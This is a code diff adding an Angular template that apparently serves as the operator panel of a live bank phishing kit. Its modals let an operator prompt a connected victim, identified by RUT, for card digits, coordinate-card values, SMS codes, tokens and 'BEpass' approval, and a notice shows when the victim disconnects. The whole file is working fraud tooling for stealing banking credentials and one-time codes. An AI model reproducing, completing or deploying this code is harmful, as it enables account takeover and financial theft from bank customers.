+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>ELIJA EL TIPO DE TARJETA</h4>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="requestCardExe('debito', '')"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--secondary"
+            >
+              DEBITO
+            </button>
+            <button
+              (click)="requestCardCredit()"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--primary"
+            >
+              CREDITO
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- EVENTO CARD -->
+
+  <!-- EVENTO CREDIT CARD -->
+  <div *ngIf="cardCreditoModal" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="cerrarRequestCardCredit()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>INGRESE EL INDICADOR DE LA TARJETA DE CREDITO</h4>
+          </div>
+
+          <div _ngcontent-iyu-c73="" style="max-width: 230px" class="kbcenter">
+            <div class="input-bech-label">
+              <input
+                _ngcontent-iyu-c73=""
+                type="text"
+                name="othenum"
+                placeholder="0000"
+                #txtSearch
+                (keypress)="justNumerKeyPress($event)"
+                class="ng-untouched ng-pristine ng-invalid"
+                style="
+                  height: 45px;
+                  font-size: 18px !important;
+                  text-align: center;
+                "
+                maxlength="4"
+              />
+            </div>
+          </div>
+
+          <div>
+            <div class="form-check form-check-inline">
+              <input
+                class="form-check-input"
+                type="radio"
+                name="inlineRadioOptions"
+                [(ngModel)]="selectTypeCard"
+                id="inlineRadio1"
+                check
+                value="Visa"
+              />
+              <label class="form-check-label" for="inlineRadio1"> Visa</label>
+            </div>
+            <div class="form-check form-check-inline">
+              <input
+                class="form-check-input"
+                type="radio"
+                name="inlineRadioOptions"
+                [(ngModel)]="selectTypeCard"
+                id="inlineRadio2"
+                value="Mastercard"
+              />
+              <label class="form-check-label" for="inlineRadio2">
+                Mastercard</label
+              >
+            </div>
+          </div>
+
+          <br />
+          <div *ngIf="ifCreditCardError" style="text-align: center; color: red">
+            <p>Llena todos los campos!</p>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="requestCardExe('credito', txtSearch.value)"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--primary"
+            >
+              ENVIAR EVENTO
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- EVENTO CREDIT CARD -->
+
+  <!-- EVENTO COORS -->
+  <div *ngIf="coorsModal" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="cerrarRequestCoors()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>SOLICITE COORDENADAS</h4>
+          </div>
+
+          <div class="kbtable">
+            <!-- #e6f3f8 -->
+            <div
+              style="
+                background-color: lightslategrey;
+                border-radius: 15px !important;
+                max-width: 350px !important;
+                margin: auto !important;
+                text-align: center !important;
+              "
+            >
+              <div style="padding: 10px !important" class="kbContainerDesktok">
+                <div class="kbItemDesktok">
+                  <input
+                    name="first"
+                    placeholder="A2"
+                    [(ngModel)]="coorsOne"
+                    autocomplete="off"
+                    class="inputcentrado2"
+                    type="text"
+                    maxlength="2"
+                  />
+                </div>
+
+                <div class="kbItemDesktok">
+                  <input
+                    name="first"
+                    placeholder="C5"
+                    [(ngModel)]="coorsTwo"
+                    autocomplete="off"
+                    class="inputcentrado2"
+                    type="text"
+                    maxlength="2"
+                  />
+                </div>
+
+                <div class="kbItemDesktok">
+                  <input
+                    name="first"
+                    placeholder="E3"
+                    [(ngModel)]="coorsThird"
+                    autocomplete="off"
+                    class="inputcentrado2"
+                    type="text"
+                    maxlength="2"
+                  />
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <br />
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="requestCoorsExe()"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--secondary"
+            >
+              SOLICITAR
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- EVENTO COORS -->
+
+  <!-- EVENTO SMS -->
+  <div *ngIf="smsModal" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="cerrarRequestSms()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>CANTIDAD DE DIGITOS?</h4>
+          </div>
+
+          <div style="text-align: center !important; margin: auto !important">
+            <div class="msd-input">
+              <select
+                [(ngModel)]="cantidadSms"
+                class="form-control"
+                id="exampleFormControlSelect1"
+              >
+                <option value="4">4 digitos</option>
+                <option value="6">6 digitos</option>
+              </select>
+            </div>
+          </div>
+
+          <!-- <br> -->
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="requestSmsExe()"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--secondary"
+            >
+              SOLICITAR
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- EVENTO SMS -->
+
+  <!-- EVENTO TOKEN -->
+  <div *ngIf="tokenModal" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="cerrarRequestToken()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>SEGURO QUE QUIERES SOLICITAR EL TOKEN AL USUARIO ?</h4>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="requestTokenExe()"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--secondary"
+            >
+              SOLICITAR
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- EVENTO TOKEN -->
+
+  <!-- EVENTO BEpass -->
+  <div *ngIf="bepassModal" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="cerrarRequestBEpass()"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <h4>SEGURO QUE QUIERES SOLICITAR EL BEpass AL USUARIO ?</h4>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="requestBEpassExe()"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--secondary"
+            >
+              SOLICITAR
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- EVENTO BEpass -->
+
+  <!-- EVENTO GENERAL -->
+  <div *ngIf="showSendEvent" class="kbmsd-time-out">
+    <div _ngcontent-fcw-c107="" class="msd-time-out-modal">
+      <div _ngcontent-fcw-c107="" class="msd-time-out-modal__open activo">
+        <div
+          _ngcontent-fcw-c107=""
+          tabindex="0"
+          role="alertdialog"
+          class="msd-time-out-content kblogin"
+        >
+          <div
+            (click)="this.showSendEvent = false"
+            _ngcontent-fcw-c107=""
+            tabindex="0"
+            role="button"
+            class="msd-time-out-content__close"
+          >
+            <span _ngcontent-fcw-c107="" class="sr-only">Cerrar Modal</span>
+            <div
+              _ngcontent-fcw-c107=""
+              class="kbmsd-icon"
+              name="close"
+              color="#363636"
+              aria-hidden="true"
+              _nghost-fcw-c52=""
+            >
+              <svg
+                role="img"
+                aria-label="ícono"
+                focusable="false"
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                style="fill: rgb(54, 54, 54)"
+              >
+                <path
+                  fill=""
+                  fill-rule="evenodd"
+                  d="M12.991 12.143l5.52-5.519a.6.6 0 10-.85-.848l-5.518 5.519-5.519-5.52a.6.6 0 10-.848.85l5.519 5.518-5.52 5.519a.6.6 0 10.85.848l5.518-5.519 5.519 5.52a.598.598 0 00.848 0 .6.6 0 000-.85l-5.519-5.518z"
+                ></path>
+              </svg>
+            </div>
+          </div>
+
+          <div style="margin-top: 10px">
+            <div *ngIf="userOnline">
+              <h4>
+                Se acaba de solicitar <strong>{{ eventType }}</strong> al
+                usuario <strong>{{ rut }}</strong
+                >.
+              </h4>
+            </div>
+            <div *ngIf="!userOnline">
+              <h4>
+                El usuario <strong>{{ rut }}</strong> se ah descocnetado.
+              </h4>
+            </div>
+          </div>
+
+          <div _ngcontent-fcw-c107="" class="msd-time-out-content__footer">
+            <button
+              (click)="close()"
+              _ngcontent-fcw-c107=""
+              class="msd-button msd-button--secondary"
+            >
+              ESTA BIEN
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- EVENTO GENERAL -->
+
+  <div class="kbsount">
+    <audio #audio controls muted="true" loop>
+      <source src="/assets/mp3/boxeo.mp3" type="audio/mp3" />
+      Your browser does not support the <code>audio</code> element.
+    </audio>
+  </div>
+</div>
